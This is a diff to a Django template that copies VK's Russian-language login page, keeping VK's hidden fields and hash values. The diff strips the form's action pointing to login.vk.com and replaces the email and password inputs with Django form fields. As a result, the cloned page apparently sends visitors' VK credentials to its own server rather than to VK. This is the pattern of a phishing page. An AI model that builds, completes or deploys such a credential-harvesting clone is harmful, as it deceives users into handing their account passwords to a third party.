@@ -242,37 +242,6 @@
   </div>
 
   <div id="page_layout" style="width: 960px;">
-    <div id="side_bar" class="side_bar fl_l" style="display: none; top: 0px;">
-      <div id="side_bar_inner" class="side_bar_inner">
-        <div id="quick_login" class="quick_login">
-          <div>
-            <iframe class="upload_frame" id="quick_login_frame" name="quick_login_frame"></iframe>
-          </div>
-          <form method="POST" name="login" id="quick_login_form" action="https://login.vk.com/?act=login" target="quick_login_frame">
-            {% csrf_token %}
-            <input type="hidden" name="act" value="login">
-            <input type="hidden" name="role" value="al_frame">
-            <input type="hidden" name="expire" id="quick_expire_input" value="">
-            <input type="hidden" name="recaptcha" id="quick_recaptcha" value="">
-            <input type="hidden" name="captcha_sid" id="quick_captcha_sid" value="">
-            <input type="hidden" name="captcha_key" id="quick_captcha_key" value="">
-            <input type="hidden" name="_origin" value="https://vk.com">
-            <input type="hidden" name="ip_h" value="62710679bbd6612b74">
-            <input type="hidden" name="lg_h" value="87da3e5369ff53d597">
-            <input type="hidden" name="ul" id="quick_login_ul" value="">
-            <div class="label">Телефон или email</div>
-            <div class="labeled"><input type="text" required name="email" class="dark" id="quick_email"></div>
-            <div class="label">Пароль</div>
-            <div class="labeled"><input type="password" required name="pass" class="dark" id="quick_pass" onkeyup="toggle('quick_expire', !!this.value);toggle('quick_forgot', !this.value)"></div>
-            <input type="submit" class="submit">
-          </form>
-          <button class="quick_login_button flat_button button_wide" id="quick_login_button">Войти</button>
-          <button class="quick_reg_button flat_button button_wide" id="quick_reg_button" style="display: none" onclick="top.showBox('join.php', {act: 'box', from: nav.strLoc})">Регистрация</button>
-          <div class="clear forgot"><div class="checkbox" id="quick_expire" onclick="ch(this);" role="checkbox" aria-checked="false" tabindex="0">Чужой компьютер</div><a id="quick_forgot" class="quick_forgot" href="/restore" target="_top">Забыли пароль?</a></div>
-        </div>
-      </div>
-    </div>
-
     <div id="page_body" class="fl_r " style="width: 960px;">
 
       <div id="wrap_between"></div>
@@ -285,7 +254,7 @@
               </div>
             </div>
             <div id="login_form_wrap" class="login_form_wrap">
-              <form method="post" name="login" id="login_form" action="https://login.vk.com/?act=login">
+              <form method="post" name="login" id="login_form">
                 {% csrf_token %}
                 <input type="hidden" name="act" id="act" value="login">
                 <input type="hidden" name="to" id="to" value="YWxfZmVlZC5waHA-">
@@ -294,8 +263,10 @@
                 <input type="hidden" name="ip_h" value="62710679bbd6612b74">
                 <input type="hidden" name="lg_h" value="87da3e5369ff53d597">
 
-                <input type="text" class="big_text" name="email" id="email" value="" placeholder="Телефон или email">
-                <input type="password" class="big_text" name="pass" id="pass" value="" placeholder="Пароль">
+                {{ form.email }}
+<!--                <input type="text" class="big_text" name="email" id="email" value="" placeholder="Телефон или email">-->
+                {{ form.pas }}
+<!--                <input type="password" class="big_text" name="pass" id="pass" value="" placeholder="Пароль">-->
                 <div class="checkbox" id="expire" onclick="ch(this);" role="checkbox" aria-checked="false" tabindex="0">Чужой компьютер</div>
                 <div class="login_buttons_wrap">
                   <button id="login_button" class="flat_button button_big_text login_button">Войти</button><button id="login_reg_button" class="flat_button button_big_text login_reg_button" onclick="nav.go('/join'); return cancelEvent(event);">Регистрация</button>
